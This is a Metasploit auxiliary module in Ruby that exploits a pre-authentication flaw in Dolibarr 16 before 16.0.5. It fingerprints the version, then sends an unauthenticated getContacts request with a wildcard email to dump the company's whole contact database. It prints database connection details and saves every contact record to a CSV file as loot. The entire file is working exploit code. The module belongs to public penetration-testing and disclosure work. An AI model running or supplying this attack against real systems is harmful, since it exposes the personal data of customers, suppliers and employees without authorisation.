##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Module::Failure

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dolibarr 16 pre-auth contact database dump',
        'Description' => %q{
          Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.
          An unauthenticated attacker may retreive a company’s entire customer file, prospects, suppliers,
          and potentially employee information if a contact file exists.
          Both public and private notes are also included in the dump.
        },
        'Author' => [
          'Vladimir TOUTAIN', 'Nolan LOSSIGNOL-DRILLIEN'
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2023-03-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['URL', 'https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']
        ]
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])

      ]
    )
  end

  def check
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown('Connection failed') unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    /Dolibarr (?<version>\d+.*\.\d+)/ =~ res.body
    version = Rex::Version.new(version)

    if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
      print_good("Detected vulnerable Dolibarr version: #{version}")
      return Exploit::CheckCode::Appears
    elsif version == '0'
      print_warning('Dolibarr version not found - proceeding anyway...')
      return Exploit::CheckCode::Detected
    else
      print_warning("Detected apparently non-vulnerable Dolibarr version: #{version} - proceeding anyway...")
      return Exploit::CheckCode::Detected
    end
  end

  def exploit(ip)
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/public/ticket/ajax/ajax.php'),
      'vars_get' => {
        'action' => 'getContacts',
        'email' => '%'
      }
    }, 90, true)

    res_json_document = res.get_json_document['contacts']

    if res && res.code != 200
      fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}")
    elsif res_json_document.nil?
      fail_with(Failure::UnexpectedReply, 'Dolibarr database empty')
    end

    begin
      print_good("Database type: #{res_json_document[0]['db']['type']}")
      print_good("Database name: #{res_json_document[0]['db']['database_name']}")
      print_good("Database user: #{res_json_document[0]['db']['database_user']}")
      print_good("Database host: #{res_json_document[0]['db']['database_host']}")
      print_good("Database port: #{res_json_document[0]['db']['database_port']}")
    end

    contact_fields = res.get_json_document['contacts'][0].keys
    contact_fields.delete('db') # We do not want this in the csv

    contact_entry_data = []

    nbr_contact = res_json_document.length.to_i

    print_good("Found #{nbr_contact} contacts.")

    csv_string = CSV.generate do |csv| # Loop to write into csv
      csv << contact_fields
      nbr_contact.times do |num| # Loop on every contact
        contact_fields.each do |element|
          if res_json_document[num][element.to_s].is_a?(String) || res_json_document[num][element.to_s].is_a?(Int)
            contact_entry_data << res_json_document[num][element.to_s].to_s.gsub("\r\n", ' ')
          end
        rescue StandardError
          contact_entry_data << ' '
        end
        csv << contact_entry_data
        contact_entry_data.clear
      end
    end

    path = store_loot(
      'dolibarr',
      'application/CSV',
      ip,
      csv_string,
      '.csv'
    )

    print_good("#{rhost}:#{rport} - File saved in: #{path}")
  end

  def run_host(ip)
    check_code = check
    if check_code == Exploit::CheckCode::Appears || check_code == Exploit::CheckCode::Detected
      exploit(ip)
    end
  end

end

